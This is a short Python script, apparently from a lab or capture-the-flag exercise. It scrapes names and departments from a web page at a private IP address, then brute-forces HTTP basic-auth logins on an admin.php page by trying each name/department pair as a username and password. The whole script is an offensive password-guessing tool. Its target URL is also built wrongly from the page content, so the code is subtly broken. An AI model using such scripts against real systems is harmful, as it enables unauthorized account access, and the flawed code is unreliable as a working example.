import requests
from bs4 import BeautifulSoup as bs4

def downloadPage(url):
	r = requests.get(url)
	response = r.content
	return response

def findNames(response):
	parser = bs4(response, 'html.parser') 
	names = parser.find_all('td', id='name')
	output = []
	for name in names:
		output.append(name.text)
	return output	

def findDepts(response):
	parser = bs4(response, 'html.parser')
	names = parser.find_all('td', id='department')
	output = []
	for name in names:
		output.append(name.text)
	return output
	
def getAuthorized(url, username, password):
	r = requests.get(url, auth=(username,password))
	if str(r.status_code)!='401':
		print(f'\nUsername:{username} - Password:{password} Code:{str(r.status_code)}\n')

page = downloadPage('http://172.16.120.120')

names = findNames(page)
uniq_names= sorted(set(names))

depts = findDepts(page)
uniq_depts = sorted(set(depts))

print('Working.. \n')
for name in uniq_names:
	for dept in uniq_depts:
		getAuthorized(f'{page}/admin.php', name, dept)
